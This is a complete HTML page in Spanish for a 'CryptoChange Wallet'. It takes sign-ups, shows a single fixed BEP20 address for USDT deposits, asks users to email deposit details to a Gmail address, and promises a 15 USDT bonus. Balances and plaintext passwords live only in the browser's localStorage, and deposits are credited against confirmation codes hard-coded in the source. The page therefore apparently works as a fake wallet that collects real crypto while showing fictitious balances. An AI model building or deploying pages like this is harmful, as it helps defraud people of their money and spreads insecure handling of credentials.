<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>CryptoChange Wallet</title>

<style>

body{
font-family:Arial;
background:#0b0f19;
color:white;
text-align:center;
}

.container{
width:90%;
max-width:500px;
margin:auto;
}

button{
padding:10px;
margin:5px;
border:none;
background:#00c896;
color:white;
cursor:pointer;
}

input{
padding:10px;
margin:5px;
width:90%;
}

.card{
background:#151a2b;
padding:20px;
margin:10px;
border-radius:10px;
}

</style>
</head>

<body>

<div class="container">

<h1>CryptoChange Wallet</h1>

<div id="auth">

<div class="card">

<h2>Registro</h2>

<input id="regUser" placeholder="Usuario">

<input id="regPass" type="password" placeholder="Contraseña">

<button onclick="register()">Crear cuenta</button>

</div>

<div class="card">

<h2>Login</h2>

<input id="logUser" placeholder="Usuario">

<input id="logPass" type="password" placeholder="Contraseña">

<button onclick="login()">Entrar</button>

</div>

</div>

<div id="wallet" style="display:none">

<div class="card">

<h2>Saldo</h2>

<h1 id="balance">0 USDT</h1>

</div>

<div class="card">

<h3>Depositar USDT</h3>

<p>Red: BEP20</p>

<p style="word-break:break-all">
0x3670a0bFfb8b8A6D42177807F8dFd369A3995b9e
</p>

<input id="amount" placeholder="Monto depositado">

<input id="hash" placeholder="Hash de transacción">

<button onclick="sendEmail()">Enviar confirmación</button>

</div>

<div class="card">

<h3>Confirmar depósito</h3>

<input id="code" placeholder="Código recibido">

<button onclick="confirmDeposit()">Confirmar</button>

</div>

<div class="card">

<h3>Historial</h3>

<div id="history"></div>

</div>

<button onclick="logout()">Cerrar sesión</button>

</div>

</div>

<script>

const codes=[
1234,2589,7412,9631,8520,
1478,3692,5551,8882,4449,
7621,1003,6504,9201,3007
]

function register(){

let u=document.getElementById("regUser").value
let p=document.getElementById("regPass").value

if(!u||!p){alert("Completa datos");return}

let users=JSON.parse(localStorage.getItem("users")||"{}")

if(users[u]){alert("Usuario existe");return}

users[u]={password:p,balance:0,history:[],bonus:false,lastCode:0}

localStorage.setItem("users",JSON.stringify(users))

alert("Cuenta creada")

}

function login(){

let u=document.getElementById("logUser").value
let p=document.getElementById("logPass").value

let users=JSON.parse(localStorage.getItem("users")||"{}")

if(!users[u]||users[u].password!=p){alert("Datos incorrectos");return}

localStorage.setItem("session",u)

loadWallet()

}

function loadWallet(){

let u=localStorage.getItem("session")

if(!u)return

document.getElementById("auth").style.display="none"

document.getElementById("wallet").style.display="block"

updateUI()

}

function updateUI(){

let u=localStorage.getItem("session")

let users=JSON.parse(localStorage.getItem("users"))

let user=users[u]

document.getElementById("balance").innerText=user.balance+" USDT"

let hist=""

user.history.forEach(h=>{

hist+="<p>"+h+"</p>"

})

document.getElementById("history").innerHTML=hist

}

function sendEmail(){

let amount=document.getElementById("amount").value
let hash=document.getElementById("hash").value

if(!amount||!hash){
alert("Completa datos")
return
}

let subject="Deposito USDT"
let body="Monto: "+amount+" USDT\nHash: "+hash

window.location.href=
"mailto:criptochangep2p@gmail.com?subject="+encodeURIComponent(subject)+"&body="+encodeURIComponent(body)

}

function confirmDeposit(){

let code=parseInt(document.getElementById("code").value)

let u=localStorage.getItem("session")

let users=JSON.parse(localStorage.getItem("users"))

let user=users[u]

if(!codes.includes(code)){
alert("Código inválido")
return
}

let now=Date.now()

if(now-user.lastCode<72*60*60*1000){
alert("Debes esperar 72 horas")
return
}

let amount=parseFloat(document.getElementById("amount").value)

if(!amount||amount<=0){
alert("Monto inválido")
return
}

user.balance+=amount

user.history.push("Depósito +"+amount+" USDT")

if(amount>=5&&!user.bonus){

user.balance+=15

user.history.push("Bono +15 USDT")

user.bonus=true

}

user.lastCode=now

users[u]=user

localStorage.setItem("users",JSON.stringify(users))

updateUI()

alert("Depósito confirmado")

}

function logout(){

localStorage.removeItem("session")

location.reload()

}

loadWallet()

</script>

</body>
</html>
